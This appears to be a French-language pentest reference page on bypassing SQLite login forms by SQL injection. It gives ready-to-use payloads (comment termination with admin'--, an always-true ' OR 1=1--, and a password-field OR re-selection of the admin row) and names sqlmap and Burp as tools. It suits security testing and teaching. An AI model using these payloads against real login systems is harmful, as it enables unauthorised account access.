---
order: 8
title: "Contournement d'authentification via l'injection SQLite"
description: "Contourner un formulaire de connexion dont le SQL est construit à partir des champs nom d'utilisateur et mot de passe dans SQLite, en utilisant la terminaison par commentaire et des conditions toujours vraies."
keywords:
  - contournement d'authentification
  - contournement de connexion
  - OR 1=1
  - injection de commentaire
  - connexion SQLite
---

# Contournement d'authentification

Une connexion qui interpole les champs soumis, comme `SELECT * FROM users WHERE username='$u' AND password='$p'`, authentifie sur toute ligne renvoyée. SQLite est un back-end courant pour les petites applications et les logiciels mobiles et de bureau, où ce schéma est fréquent.

Commenter le contrôle du mot de passe connecte en tant qu'utilisateur choisi. Le commentaire `--` de SQLite supprime le reste de la ligne :

```
username: admin'--
query:    SELECT * FROM users WHERE username='admin'-- ' AND password='...'
```

Une condition toujours vraie renvoie la première ligne quand aucun compte n'est visé :

```
username: ' OR 1=1--
query:    SELECT * FROM users WHERE username='' OR 1=1-- ' AND password='...'
```

Quand seul le champ mot de passe est injectable et que le nom d'utilisateur est fixe, la terminaison par commentaire ne contourne pas (elle testerait simplement `password='admin'`) ; re-sélectionnez la cible de sorte que le `AND` final soit satisfait par un `OR` :

```
password: ' OR username='admin'--
```

Comme `AND` est prioritaire sur `OR`, ceci s'évalue comme `(username='admin' AND password='') OR username='admin'`, ce qui renvoie la ligne admin. La possibilité d'ajouter une instruction empilée dépend de l'API (`sqlite3_exec` le permet, une instruction préparée non), mais le contournement n'a besoin que du renvoi d'une ligne par l'unique requête.

## Outils

- **sqlmap** : confirme et prend l'empreinte du champ de connexion injectable.
- Test manuel avec Burp Repeater et le client sqlite3.

## Références

- SQLite Documentation: comments, SELECT, expressions
- OWASP Testing Guide: Testing for SQL Injection
